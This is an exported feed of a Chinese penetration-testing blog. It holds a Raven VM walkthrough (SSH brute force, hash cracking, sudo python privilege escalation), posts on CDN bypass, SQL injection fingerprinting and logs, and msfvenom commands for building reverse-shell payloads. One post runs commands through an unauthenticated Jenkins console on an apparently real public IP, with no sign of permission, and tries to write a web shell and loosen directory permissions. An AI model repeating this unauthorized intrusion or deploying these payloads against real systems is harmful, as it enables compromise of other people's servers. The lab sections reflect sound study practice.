<h4 id="开始对ssh爆破"><a href="#开始对ssh爆破" class="headerlink" title="开始对ssh爆破"></a>开始对ssh爆破</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//收集信息</span><br><span class="line"><span class="meta">$</span><span class="bash">cewl http://192.168.222.161/wordpress/ -d 3 -w raven1.txt</span></span><br><span class="line">//发现该字典中没有刚才我们找到的名字，添加进去</span><br><span class="line">//开始爆破</span><br><span class="line"><span class="meta">$</span><span class="bash">hydra -l michael -P raven1.txt ssh://192.168.222.161</span></span><br><span class="line"></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-14 21:29:01</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 69 login tries (l:1/p:69), ~5 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.222.161:22/</span><br><span class="line">[22][ssh] host: 192.168.222.161   login: michael   password: michael</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 1 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 1 target did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 targets did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-14 21:29:04</span><br></pre></td></tr></table></figure>

<p>成功爆破出ssh账号和密码为<code>login: michael   password: michael。</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">ssh michael@192.168.222.161</span></span><br><span class="line">//输入密码后成功登录</span><br><span class="line"><span class="meta">$</span><span class="bash">michael@Raven:~$</span></span><br></pre></td></tr></table></figure>

<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>在<code>/var/www</code>目录下看见了<code>flag2</code></p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415080951.png" alt="image-20200415080949790"></p>
<h4 id="查看特权"><a href="#查看特权" class="headerlink" title="查看特权"></a>查看特权</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user root -perm 4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415082014.png" alt="image-20200415082011478"></p>
<p>可以看见michael用户对这些命令用于suid权限，但不知道如何利用</p>
<h4 id="查看mysql配置"><a href="#查看mysql配置" class="headerlink" title="查看mysql配置"></a>查看mysql配置</h4><p>居然忘记了查看这个配置，一般搭建网站的时候都需要连接数据库的，mysql配置文件一般保存在网站目录那附近。在wordpress/wp-config.php中发现了mysql配置</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415083806.png" alt="image-20200415083805065"></p>
<p>尝试利用该密码登录ssh，失败，直接登录mysql数据库</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415085108.png" alt="image-20200415085103586"></p>
<p>发现两个用户</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415085228.png" alt="image-20200415085227097"></p>
<h4 id="flag3-amp-amp-flag4"><a href="#flag3-amp-amp-flag4" class="headerlink" title="flag3 &amp;&amp; flag4"></a>flag3 &amp;&amp; flag4</h4><p>直接在数据库中的wp_posts表中查到了flag3和flag4？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from wp_posts;</span><br><span class="line">#发现select * from wp_posts\G;能让数据更加整齐</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415085451.png" alt="image-20200415085450028"></p>
<h4 id="破解数据库密码"><a href="#破解数据库密码" class="headerlink" title="破解数据库密码"></a>破解数据库密码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT CONCAT(user_login, &quot;:&quot;, user_pass) FROM wp_users INTO OUTFILE&#39;&#x2F;tmp&#x2F;wordpress.txt&#39;;</span><br><span class="line"></span><br><span class="line">michael@Raven:&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress$ cat &#x2F;tmp&#x2F;wordpress.txt </span><br><span class="line">michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0</span><br><span class="line">steven:$P$Bk3VD9jsxx&#x2F;loJoqNsURgHiaB23j7W&#x2F;</span><br><span class="line"></span><br><span class="line">#复制其中内容，在kali下生成wordpress.txt文件，使用john破解</span><br><span class="line">$sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt wordpress.txt</span><br></pre></td></tr></table></figure>

<p>![image-20200415095509722](D:/Program Files/Typora/upload/image-20200415095509722.png)</p>
<h4 id="使用这个账号登录"><a href="#使用这个账号登录" class="headerlink" title="使用这个账号登录"></a>使用这个账号登录</h4><p>成功登录ssh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//列出目前用户可执行与无法执行的指令；</span><br><span class="line"><span class="meta">$</span><span class="bash">sudo -l</span></span><br><span class="line">Matching Defaults entries for steven on raven:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User steven may run the following commands on raven:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python</span><br><span class="line"></span><br><span class="line">//提权，在root目录下发现第四个flag</span><br><span class="line"><span class="meta">$</span><span class="bash">sudo python -c <span class="string">'import os; os.system("/bin/sh")'</span></span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">flag4.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat flag4.txt </span></span><br><span class="line">______                      </span><br><span class="line"></span><br><span class="line">| ___ \                     </span><br><span class="line"></span><br><span class="line">| |_/ /__ ___   _____ _ __  </span><br><span class="line"></span><br><span class="line">|    // _` \ \ / / _ \ '_ \ </span><br><span class="line"></span><br><span class="line">| |\ \ (_| |\ V /  __/ | | |</span><br><span class="line"></span><br><span class="line">\_| \_\__,_| \_/ \___|_| |_|</span><br><span class="line"></span><br><span class="line">                            </span><br><span class="line">flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;</span><br><span class="line"></span><br><span class="line">CONGRATULATIONS on successfully rooting Raven!</span><br><span class="line"></span><br><span class="line">This is my first Boot2Root VM - I hope you enjoyed it.</span><br><span class="line"></span><br><span class="line">Hit me up on Twitter and let me know what you thought: </span><br><span class="line"></span><br><span class="line">@mccannwj / wjmccann.github.io</span><br></pre></td></tr></table></figure>

<p>而之前的<code>michael</code>用户运行<code>sudo -l</code>时需要输入密码</p>
<h4 id="sudo提权原理"><a href="#sudo提权原理" class="headerlink" title="sudo提权原理"></a>sudo提权原理</h4><p>查看<code>/etc/sudoers</code>文件（提权后查看）</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415104918.png" alt="image-20200415104917379"></p>
<p>可以看见不需要密码就能以root权限执行python命令，应该算是配置不当吧</p>
<h4 id="尝试对-etc-shadow的root账号密码进行破解"><a href="#尝试对-etc-shadow的root账号密码进行破解" class="headerlink" title="尝试对/etc/shadow的root账号密码进行破解"></a>尝试对/etc/shadow的root账号密码进行破解</h4><h5 id="shadow文件解析"><a href="#shadow文件解析" class="headerlink" title="shadow文件解析"></a>shadow文件解析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;加密后的口令密码&#125;的格式为 $id$salt$encrypted</span><br><span class="line">id为1时，采用md5算法加密</span><br><span class="line">id为5时，采用SHA256算法加密</span><br><span class="line">id为6时，采用SHA512算法加密</span><br><span class="line">salt为盐值,是对密码进行hash的一个干扰值</span><br><span class="line">encrypted为散列值</span><br></pre></td></tr></table></figure>

<p>同样使用john来破解，只需要将/etc/shadow文件root那一行拷贝出来，复制到kali的shadow.txt文件中。但是没有破解成功。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li><p>信息收集要细，渗透思路要清晰</p>
</li>
<li><p>使用cewl和cupp生成密码字典</p>
</li>
<li><p>使用john爆破hash密码</p>
</li>
<li><p>sudo提权，可以参考<a href="[https://evilanne.github.io/2019/07/24/sudo%E6%8F%90%E6%9D%83/](https://evilanne.github.io/2019/07/24/sudo提权/)">这篇文章</a></p>
</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><code>hack学习</code>公众号文章</p>
]]></content>
      <categories>
        <category>后渗透</category>
      </categories>
      <tags>
        <tag>靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>jenkins未授权</title>
    <url>/2020/03/31/JenKins%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="Jenkins利用"><a href="#Jenkins利用" class="headerlink" title="Jenkins利用"></a>Jenkins利用</h2><a id="more"></a>







<blockquote>
<p><strong>目标</strong>：<a href="http://5.196.89.136:8090/script" target="_blank" rel="noopener">http://5.196.89.136:8090/script</a></p>
</blockquote>
<h4 id="查看是否能够出网"><a href="#查看是否能够出网" class="headerlink" title="查看是否能够出网"></a>查看是否能够出网</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ping -c 3 www.baidu.com&quot;.execute().text</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135353.png" alt="image-20200327135351787"></p>
<p>结果显示可以。</p>
<h4 id="查看web路径"><a href="#查看web路径" class="headerlink" title="查看web路径"></a>查看web路径</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;httpd -V&quot;.execute().text</span><br></pre></td></tr></table></figure>





<h4 id="目录列举"><a href="#目录列举" class="headerlink" title="目录列举"></a>目录列举</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ls &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135651.png" alt="image-20200327135649845"></p>
<h4 id="写入Web-shell测试"><a href="#写入Web-shell测试" class="headerlink" title="写入Web shell测试"></a>写入Web shell测试</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new File(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&quot;).write(&quot;&lt;?php phpinfo(); ?&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327140018.png" alt="image-20200327140016826"></p>
<p>发现没有写入权限。</p>
<h3 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;chmod 777 &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>



<h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p><a href="https://www.cnblogs.com/cwkiller/p/12578924.html" target="_blank" rel="noopener">CVE-2018-1000861复现</a></p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>未授权</tag>
      </tags>
  </entry>
  <entry>
    <title>cdn绕过</title>
    <url>/2020/03/30/cdn%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="cdn绕过"><a href="#cdn绕过" class="headerlink" title="cdn绕过"></a>cdn绕过</h2><h3 id="什么是cdn"><a href="#什么是cdn" class="headerlink" title="什么是cdn"></a>什么是cdn</h3><p>​    CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
<a id="more"></a>

<p>​    当服务器很远时，访问的速度会收到影响，cdn可以理解为一个缓存节点，可以从距离自己很近的cdn节点来获取数据而不是真实服务器。当网站开启cdn加速后，我们访问这个网站时，访问到的不是服务器的真实ip地址，而只是一个缓存节点。</p>
<p>​    </p>
<h3 id="怎么检测是否存在cdn？"><a href="#怎么检测是否存在cdn？" class="headerlink" title="怎么检测是否存在cdn？"></a>怎么检测是否存在cdn？</h3><ul>
<li><p>多地ping（超级ping）——如果全国各地访问的是同一个ip，则很明显没有使用cdn加速。下面是使用cdn加速的网站截图。<br><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330134015.png" alt="image-20200330134013660"></p>
</li>
<li><p>nslookup——看非权威应答返回的ip数量，当数量只有一个时明显没有使用cdn。（感觉这个方法不是很可靠，下面是反例）<br><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330134651.png" alt="image-20200330134649941"></p>
</li>
<li><p>使用<a href="https://www.cdnplanet.com/tools/cdnfinder/#site:https://www.lenovo.com" target="_blank" rel="noopener">cdn工具</a>查看</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330134538.png" alt="image-20200330134533284"></p>
</li>
</ul>
<h3 id="如何绕过cdn得到真实ip"><a href="#如何绕过cdn得到真实ip" class="headerlink" title="如何绕过cdn得到真实ip"></a>如何绕过cdn得到真实ip</h3><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><p>​    开启cdn需要一定费用，很多企业只会选择重要的主站开启cdn加速服务，而其他访问量较少的子站则没有，但是可能存在主站和子站在同一服务器（ip地址）上的情况。</p>
<h4 id="国外地址查询"><a href="#国外地址查询" class="headerlink" title="国外地址查询"></a>国外地址查询</h4><p>​    利用国内和国外的访问人数的不同，有些公司在国内用户很多，而在国外没有太多用户，所以只在国内开启了cdn服务，国外没有开启，因此可以通过国外访问来获取真实ip。</p>
<h4 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h4><p>​    很多网站注册的时候会绑定邮箱，收到一些从服务器发来的邮件，可以通过查找邮件来源来获取真实ip地址。或者可以想办法从目标服务器向外发出邮件，比如使用RSS邮件订阅。</p>
<p>​    得到邮件后查看邮件原文如下</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330143235.png" alt="image-20200330143234135"></p>
<h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><ul>
<li>通过敏感文件，如phpinfo，GitHub信息泄露等</li>
</ul>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330135834.png" alt="image-20200330135832062"></p>
<ul>
<li><p>扫全网——扫描全球各地同时请求，利用不可能全球各国全部使用cdn这个假说。</p>
</li>
<li><p>dns历史记录——查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录。</p>
</li>
<li><p>黑暗引擎（shodan，fofa …）——成功率不高，利用网站刚建立就被这些引擎扫描到，而这时没有开启cdn。</p>
</li>
<li><p>ping的不同姿势——可能设置cdn的域名是<code>www.baidu.com</code>而不是<code>baodu.com</code> (我不知道是否可靠)</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330141254.png" alt="image-20200330141245899"></p>
</li>
<li><p>一些查询网站查询真实ip</p>
<p><code>https://get-site-ip.com/</code></p>
</li>
</ul>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330142045.png" alt="image-20200330142044085"></p>
<ul>
<li>SSL证书查询——使用<code>Censys</code></li>
</ul>
<h3 id="cdn工具使用"><a href="#cdn工具使用" class="headerlink" title="cdn工具使用"></a>cdn工具使用</h3><h4 id="w8fuckcdn"><a href="#w8fuckcdn" class="headerlink" title="w8fuckcdn"></a>w8fuckcdn</h4><blockquote>
<p>通过扫描全网绕过CDN获取网站IP地址</p>
</blockquote>
<p>项目地址: <code>https://github.com/boy-hack/w8fuckcdn</code></p>
<p>用法: <code>python get_ips.py -d baidu.com</code></p>
<p>本来想使用一下的，结果运行报错，还是直接调用masscan感觉有点不太行。</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>cdn</tag>
      </tags>
  </entry>
  <entry>
    <title>sql参数化</title>
    <url>/2020/03/29/sql%E5%8F%82%E6%95%B0%E5%8C%96/</url>
    <content><![CDATA[<h2 id="sql参数化"><a href="#sql参数化" class="headerlink" title="sql参数化"></a>sql参数化</h2><p>sql参数化可以从根本上防止sql注入，sql注入的根本在于用户恶意拼接sql语句，数据库会将整个sql语句执行，而sql参数化采用预编译的方式，将用户输入的数据作为参数处理。下面是一段网上的java的预编译代码，很好理解。</p>
<a id="more"></a>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"></span><br><span class="line">String sql = <span class="string">"select * from user where username=? and passwd=?"</span>;</span><br><span class="line">ps = conn.PreparedStatement(sql);</span><br><span class="line">ps.setString(<span class="number">1</span>, <span class="string">"admin"</span>);</span><br><span class="line">ps.setString(<span class="number">2</span>, <span class="string">"123456"</span>);</span><br><span class="line">resultSet = ps.executeQuery();</span><br></pre></td></tr></table></figure>

<p>在这段代码中就不会存在sql拼接的现象，即使用户输入<code>username</code>=<code>admin‘ or 1=1</code>，数据库在执行时只会把这个当做一个用户，去查询有没有<code>admin‘ or 1=1</code>的用户。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a href="https://www.zhihu.com/question/52869762" target="_blank" rel="noopener">https://www.zhihu.com/question/52869762</a></p>
</blockquote>
<h3 id="sql数据库识别"><a href="#sql数据库识别" class="headerlink" title="sql数据库识别"></a>sql数据库识别</h3><p>常见的数据库一般有mysql，access，oracle，postgresql，sqlserver（mssql) 这五类</p>
<h4 id="根据框架组合识别"><a href="#根据框架组合识别" class="headerlink" title="根据框架组合识别"></a>根据框架组合识别</h4><table>
<thead>
<tr>
<th align="center">框架</th>
<th align="center">常用数据库</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Asp和。net</td>
<td align="center">sqlserver</td>
</tr>
<tr>
<td align="center">php</td>
<td align="center">mysql和postgesql</td>
</tr>
<tr>
<td align="center">java</td>
<td align="center">oracle和mysql</td>
</tr>
<tr>
<td align="center">iis（基于windows）</td>
<td align="center">sqlserver</td>
</tr>
<tr>
<td align="center">apache</td>
<td align="center">mysql和postgresql</td>
</tr>
<tr>
<td align="center">asp</td>
<td align="center">access和sqlserver</td>
</tr>
</tbody></table>
<h4 id="报错信息判断"><a href="#报错信息判断" class="headerlink" title="报错信息判断"></a>报错信息判断</h4><p>在参数后面加个’或者”如<code>id=1&#39;</code>尝试引发报错，通过回显错误信息判断</p>
<p>对于<code>acecss</code>数据库会回显<code>Microsoft JET Database Engine 错误’80040e14</code> </p>
<p>对于<code>sqlserver</code>数据库会回显<code>ODBC</code>,<code>Msg</code></p>
<p>对于<code>mysql</code>数据库会回显<code>you have an error in your SQL syntax</code></p>
<p>对于<code>oracle</code>数据库会回显<code>ora-错误编号</code></p>
<h4 id="特定连接符判断"><a href="#特定连接符判断" class="headerlink" title="特定连接符判断"></a>特定连接符判断</h4><table>
<thead>
<tr>
<th align="center">数据库</th>
<th align="center">连接符查询</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mysql</td>
<td align="center">select ‘str’’ing’ <br />select concat(‘str’,’’ing)<br /> select ‘str’+’ing’</td>
</tr>
<tr>
<td align="center">sqlserver</td>
<td align="center">select ‘str’+’ing’</td>
</tr>
<tr>
<td align="center">oracle</td>
<td align="center">select ‘str’||’ing’ <br />select concat(‘str’,’’ing)</td>
</tr>
</tbody></table>
<h4 id="通过不同数据库特有的表判断"><a href="#通过不同数据库特有的表判断" class="headerlink" title="通过不同数据库特有的表判断"></a>通过不同数据库特有的表判断</h4><table>
<thead>
<tr>
<th align="center">数据库</th>
<th align="center">特有的表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mysql（&gt;5.0）</td>
<td align="center">information_schema.TABLES</td>
</tr>
<tr>
<td align="center">sqlserver</td>
<td align="center">sysobjects</td>
</tr>
<tr>
<td align="center">oracle</td>
<td align="center">sys.user_tables</td>
</tr>
<tr>
<td align="center">access</td>
<td align="center">msysobjects</td>
</tr>
</tbody></table>
<p>在存在注入点的情况下可以使用以下用法判断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from 特有表名)&gt;0 and 1&#x3D;1</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Web漏洞基础知识</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>日志</title>
    <url>/2020/03/29/%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>做了下实习笔试题，在日志这块上不是很了解，答得很糟，所以现在学习总结一下。</p>
<a id="more"></a>

<h3 id="查看win10日志"><a href="#查看win10日志" class="headerlink" title="查看win10日志"></a>查看win10日志</h3><p>在<code>事件处理器</code>中可以看到，不过要以管理员运行。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200329085145.png" alt="image-20200329085144198"></p>
<p>可以看到win10的日志分了以下几个模块</p>
<ul>
<li>应用程序</li>
<li>安全</li>
<li>Setup</li>
<li>系统</li>
<li>Forwarded Events</li>
</ul>
<p>点击右边侧栏中的属性选项可以看到该日志文件的存放位置</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200329085638.png" alt="image-20200329085636402"></p>
<p>所以这五个日志模块的存放位置是在<code>C:\Windows\System32\winevt\Logs</code>下，该目录下有很多小的日志文件可能是其他系统服务的日志文件</p>
<p>应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx</p>
<p>安全日志：%SystemRoot%\System32\Winevt\Logs\Security.evtx</p>
<p>安装日志：%SystemRoot%\System32\Winevt\Logs\Setup.evtx</p>
<p>系统日志： %SystemRoot%\System32\Winevt\Logs\System.evtx</p>
<p>Forwarded Event日志：%SystemRoot%\System32\Winevt\Logs\ForwardedEvents.evtx</p>
<h3 id="linux日志"><a href="#linux日志" class="headerlink" title="linux日志"></a>linux日志</h3><p>linux的日志文件存放在<code>/var/log/</code>下。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200329090719.png" alt="image-20200329090718478"></p>
<p><strong>/var/log/faillog –包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。</strong></p>
<p><strong>/var/log/btmp –包含所有失败登录信息</strong></p>
<p>该目录下处理系统日志以外，还包括了apache2，mysql等应用的日志。</p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过安全狗</title>
    <url>/2020/03/29/%E6%9C%AC%E5%9C%B0%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97%E5%B0%9D%E8%AF%95/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="9c6188e81121a6897f28be5d45c4ec416d48ce64e6cc0e23b187001073f40fb9"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>msfvenom用法</title>
    <url>/2020/03/29/msfvenom/</url>
    <content><![CDATA[<h2 id="msfvenom用法"><a href="#msfvenom用法" class="headerlink" title="msfvenom用法"></a>msfvenom用法</h2><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><a id="more"></a>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Options:</span><br><span class="line">   -l, --list            &lt;type&gt;        # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等</span><br><span class="line">   -p, --payload         &lt;payload&gt;     # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span><br><span class="line">       --list-options                  # 列出--payload &lt;value&gt; 的标准，高级和规避选项</span><br><span class="line">   -f, --format          &lt;format&gt;      # 指定 Payload 的输出格式(使用 --list formats 列出)</span><br><span class="line">   -e, --encoder         &lt;encoder&gt;     # 指定使用的 Encoder (使用 --list encoders 列出)</span><br><span class="line">       --sec-name        &lt;value&gt;       # 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串</span><br><span class="line">       --smallest                      # 使用所有可用的编码器生成最小的payload</span><br><span class="line">       --encrypt         &lt;value&gt;       # 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)</span><br><span class="line">       --encrypt-key     &lt;value&gt;       # 用于加密的密钥</span><br><span class="line">       --encrypt-iv      &lt;value&gt;       # 加密的初始化向量</span><br><span class="line">   -a, --arch            &lt;arch&gt;        # 指定目标系统架构(使用 --list archs  列出)</span><br><span class="line">       --platform        &lt;platform&gt;    # 指定目标系统平台 (使用 --list platforms 列出)</span><br><span class="line">   -o, --out             &lt;path&gt;        # 保存payload文件</span><br><span class="line">   -b, --bad-chars       &lt;list&gt;        # 设置需要在 Payload 中避免出现的字符，如： '\x00\xff'</span><br><span class="line">   -n, --nopsled         &lt;length&gt;      # 指定 nop 在 payload 中的数量</span><br><span class="line">   -s, --space           &lt;length&gt;      # 设置未经编码的 Payload 的最大长度</span><br><span class="line">       --encoder-space   &lt;length&gt;      # 编码后的 Payload 的最大长度</span><br><span class="line">   -i, --iterations      &lt;count&gt;       # 设置 Payload 的编码次数</span><br><span class="line">   -c, --add-code        &lt;path&gt;        # 指定包含一个额外的win32 shellcode文件</span><br><span class="line">   -x, --template        &lt;path&gt;        # 指定一个特定的可执行文件作为模板</span><br><span class="line">   -k, --keep                          # 保护模板程序的功能，注入的payload作为一个新的进程运行</span><br><span class="line">   -v, --var-name        &lt;value&gt;       # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span><br><span class="line">   -t, --timeout         &lt;second&gt;      # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）</span><br><span class="line">   -h, --help                          # 帮助</span><br></pre></td></tr></table></figure>



<h4 id="使用–list-encorders查看所有编码器"><a href="#使用–list-encorders查看所有编码器" class="headerlink" title="使用–list encorders查看所有编码器"></a>使用–list encorders查看所有编码器</h4><p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200325160228.png" alt=""></p>
<p>同理可以使用</p>
<p><code>--list payloads</code> 查看所有payloads</p>
<p><code>--list archs</code> 查看所有架构</p>
<p><code>--list platform</code> 查看所有平台。</p>
<p><code>--list formats</code> 查看所有输出格式</p>
<p><code>--list</code> 也可以使用<code>-l</code>代替</p>
<h3 id="生成payload的不同方式"><a href="#生成payload的不同方式" class="headerlink" title="生成payload的不同方式"></a>生成payload的不同方式</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><h5 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f exe -e x86/shikata_ga_nai &gt; shell.ex</span><br></pre></td></tr></table></figure>

<h5 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f exe -e powershell_base64 &gt; shell.exe</span><br></pre></td></tr></table></figure>



<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><h5 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f elf -e x86/shikata_ga_nai &gt; shell.elf</span><br></pre></td></tr></table></figure>

<h5 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f elf -e powershell_base64 &gt; shell.elf</span><br></pre></td></tr></table></figure>

